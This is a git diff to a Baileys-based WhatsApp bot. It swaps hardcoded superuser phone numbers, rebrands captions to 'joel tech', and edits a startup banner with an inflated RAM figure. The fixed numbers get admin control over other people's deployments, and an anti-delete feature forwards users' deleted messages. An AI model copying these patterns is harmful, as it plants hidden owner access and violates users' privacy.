@@ -156,10 +156,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254114141192';
-            const dj2 = '254751284190';
-            const dj3 = "254742063632";
-            const luffy = '254762016957';
+            const dj = '255714595078';
+            const dj2 = '255781144539';
+            const dj3 = "255767570963";
+            const luffy = '255714595078';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -288,7 +288,7 @@ function mybotpic() {
         
                                     if(msg === null || !msg ||msg === 'undefined') {console.log('Message non trouver') ; return } 
         
-                                await zk.sendMessage(idBot,{ image : { url : './media/deleted-message.jpg'},caption : `        😈Anti-delete-message😈\n Message from @${msg.key.participant.split('@')[0]}​` , mentions : [msg.key.participant]},)
+                                await zk.sendMessage(idBot,{ image : { url : './media/deleted-message.jpg'},caption : `        Anti-delete-message by joel tech\n Message from @${msg.key.participant.split('@')[0]}​` , mentions : [msg.key.participant]},)
                                 .then( () => {
                                     zk.sendMessage(idBot,{forward : msg},{quoted : msg}) ;
                                 })
@@ -444,7 +444,7 @@ function mybotpic() {
 
                                       if (action === 'remove') {
 
-                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} has been removed from group by Beltah.\n\n> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐁𝐄𝐋𝐓𝐀𝐇 𝐓𝐄𝐂𝐇`;
+                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} has been removed from group by Beltah.\n\n> powered by joel kang'oma`;
 
                                     await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                                     (0, baileys_1.delay)(800);
@@ -849,15 +849,13 @@ zk.ev.on('group-participants.update', async (group) => {
                 if((conf.DP).toLowerCase() === 'yes') {     
 
                 let cmsg =`BEST CODER MD IS ONLINE 
-╭─────────❒⁠⁠⁠⁠              
-> Prefix   : [ ${prefixe} ]   
-> Mode   : ${md}
-> Plugins  : ${evt.cm.length} 
-> Ram   : 129.99GB
-> Platform : chrome linux
-> Owner  : Beltah Ke
-╰─────────❒
-> powered by joel kang'oma 
+            
+ Prefix   : [ ${prefixe} ]   
+ Mode   : ${md}
+ Plugins  : ${evt.cm.length} 
+ Ram   :  61GB
+ owner  : joel tech
+ powered by joel kang'oma 
  ⁠⁠╰─────────────────❒`;
 
                 await zk.sendMessage(zk.user.id, { text: cmsg });
